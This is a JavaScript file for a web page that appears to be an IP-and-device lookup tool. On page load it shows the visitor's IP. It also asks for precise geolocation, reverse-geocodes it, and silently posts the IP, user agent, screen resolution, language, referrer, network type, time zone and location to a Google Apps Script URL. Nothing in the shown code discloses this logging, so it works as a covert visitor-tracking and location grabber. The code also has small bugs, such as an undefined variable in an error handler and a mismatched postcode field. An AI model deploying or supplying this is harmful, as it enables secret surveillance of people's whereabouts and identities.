document.addEventListener("DOMContentLoaded", function () {
    const loader = document.getElementById('loader');
    const ipDiv = document.getElementById('ip');
    const deviceInfoDiv = document.getElementById('device-info');

    // Fetch the IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            ipDiv.textContent = data.ip;
            loader.classList.add('hidden'); // Hide loader
            ipDiv.classList.remove('hidden'); // Show IP

            const deviceInfo = getDeviceInfo(navigator.userAgent);

            deviceInfoDiv.innerHTML = `
                Device: ${deviceInfo.device}<br>
                OS: ${deviceInfo.os}<br>
                Browser: ${deviceInfo.browser}<br>`;
            deviceInfoDiv.classList.remove('hidden'); // Show device info

            // Get and display the user's location
            getLocation(location => {
                if (location.latitude && location.longitude) {
                    // Reverse geocode to get city and area name
                    reverseGeocode(location.latitude, location.longitude);
                } else {
                    // Log all data if location access is denied
                    logToSheet({ latitude: null, longitude: null, city: 'Location access denied', area: 'Location access denied' });
                }
            });
        })
        .catch(error => {
            console.error('Error fetching IP address:', error);
            loader.classList.add('hidden'); // Hide loader
            ipDiv.textContent = 'Unable to retrieve IP address.';
            ipDiv.classList.remove('hidden'); // Show error message
        });
});

function getDeviceInfo(userAgent) {
    let device = "Unknown Device";
    let os = "Unknown OS";
    let osVersion = "Unknown OS Version";
    let browser = "Unknown Browser";
    let browserVersion = "Unknown Browser Version";

    // Determine the operating system and version
    if (/android/i.test(userAgent)) {
        os = "Android";
        const androidVersion = userAgent.match(/Android\s([0-9.]*)/);
        osVersion = androidVersion ? androidVersion[1] : "Unknown";
    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
        os = "iOS";
        const iosVersion = userAgent.match(/OS\s([0-9_]+)/);
        osVersion = iosVersion ? iosVersion[1].replace(/_/g, '.') : "Unknown";
    } else if (/windows nt/i.test(userAgent)) {
        os = "Windows";
        const windowsVersion = userAgent.match(/Windows NT\s([0-9.]*)/);
        osVersion = windowsVersion ? windowsVersion[1] : "Unknown";
    } else if (/mac os x/i.test(userAgent) && !/iphone|ipad|ipod/i.test(userAgent)) {
        os = "MacOS";
        const macVersion = userAgent.match(/Mac OS X\s([0-9_]+)/);
        osVersion = macVersion ? macVersion[1].replace(/_/g, '.') : "Unknown";
    } else if (/linux/i.test(userAgent)) {
        os = "Linux";
    }

    // Determine the browser and version
    if (/chrome|crios/i.test(userAgent)) {
        browser = "Chrome";
        const chromeVersion = userAgent.match(/(Chrome|CriOS)\/([0-9.]*)/);
        browserVersion = chromeVersion ? chromeVersion[2] : "Unknown";
    } else if (/firefox|fxios/i.test(userAgent)) {
        browser = "Firefox";
        const firefoxVersion = userAgent.match(/(Firefox|FxiOS)\/([0-9.]*)/);
        browserVersion = firefoxVersion ? firefoxVersion[2] : "Unknown";
    } else if (/safari/i.test(userAgent) && !/chrome|crios/i.test(userAgent)) {
        browser = "Safari";
        const safariVersion = userAgent.match(/Version\/([0-9.]*)/);
        browserVersion = safariVersion ? safariVersion[1] : "Unknown";
    } else if (/edge/i.test(userAgent)) {
        browser = "Edge";
        const edgeVersion = userAgent.match(/Edge\/([0-9.]*)/);
        browserVersion = edgeVersion ? edgeVersion[1] : "Unknown";
    } else if (/opr|opera/i.test(userAgent)) {
        browser = "Opera";
        const operaVersion = userAgent.match(/(Opera|OPR)\/([0-9.]*)/);
        browserVersion = operaVersion ? operaVersion[2] : "Unknown";
    }

    // Determine device type (basic detection)
    if (/mobile/i.test(userAgent)) {
        device = "Mobile Device";
    } else if (/tablet/i.test(userAgent)) {
        device = "Tablet";
    } else {
        device = "Desktop";
    }

    return { device, os, osVersion, browser, browserVersion };
}

function getLocation(callback) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const { latitude, longitude } = position.coords;
                console.log("Latitude: ", latitude, "Longitude: ", longitude)
                callback({ latitude, longitude }); // Call callback with coordinates
            },
            error => {
                console.error("Error retrieving location:", error);
                console.log("Latitude: ", latitude, "Longitude: ", latitude)
                callback({ latitude: null, longitude: null }); // Return null values on error
            }
        );
    } else {
        console.error("Geolocation is not supported by this browser.");
        callback({ latitude: null, longitude: null }); // Return null values if geolocation is not supported
    }
}

async function reverseGeocode(latitude, longitude) {
    const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;

    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data && data.address) {
            const { address } = data;
            const city = address.city || address.town || address.village || address.state_district || address.county || address.state || "Unknown City";
            const area = address.neighbourhood || address.suburb || address.town || address.village || address.state || address.region || "Unknown Area";
            const postcode = address.postcode || "Unknown Postcode";
            const country = address.country || "Unknown Country";

            // Log all details to the sheet, including city, area, postcode, and country
            console.log("location info: ", latitude, longitude, city, area, postcode, country)
            logToSheet({ latitude, longitude, city, area, postcode, country });

        } else {
            logToSheet({ latitude, longitude, city: "Unknown", area: "Unknown", postcode: "Unknown", country: "Unknown" });
        }
    } catch (error) {
        console.error("Error fetching location details:", error);
        logToSheet({ latitude: null, longitude: null, city: 'Location access denied', area: 'Location access denied', postcode: 'Unknown', country: 'Unknown' });
    }
}


function logToSheet(location) {
    const ipText = document.getElementById('ip').innerText;
    const deviceInfo = getDeviceInfo(navigator.userAgent);
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language || navigator.userLanguage;
    const referrer = document.referrer || 'Direct Access';
    const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // Concatenate all location details into one string
    const locationDetails = `Lat: ${location.latitude || 'Location access denied'}, Lon: ${location.longitude || 'Location access denied'}, ` +
        `City: ${location.city || 'City access denied'}, Area: ${location.area || 'Area access denied'}, ` +
        `Postal Code: ${location.postalCode || 'Postal Code access denied'}, Country: ${location.country || 'Country access denied'}`;

    const appScriptUrl = 'https://script.google.com/macros/s/AKfycbx7z5d-F-hqOt18yyZezqQOg0GN1r8bjx6EcscC_lNrTdjpKEsJIh7wm51qIXWbhHNLXg/exec';

    console.log('Data to be sent:', {
        text: ipText,
        device: deviceInfo.device,
        os: deviceInfo.os,
        browser: deviceInfo.browser,
        userAgent: navigator.userAgent,
        screenResolution: screenResolution,
        language: language,
        referrer: referrer,
        networkType: networkType,
        timeZone: timeZone,
        location: locationDetails
    });

    fetch(appScriptUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            text: ipText,
            device: deviceInfo.device,
            os: deviceInfo.os,
            browser: deviceInfo.browser,
            userAgent: navigator.userAgent,
            screenResolution: screenResolution,
            language: language,
            referrer: referrer,
            networkType: networkType,
            timeZone: timeZone,
            location: locationDetails // Send the concatenated location string
        }),
    })
        .then(response => {
            console.log('Response:', response);
            return response.json(); // Parse the JSON response
        })
        .then(data => console.log('Success:', data))
        .catch(error => console.error('Error:', error));
}

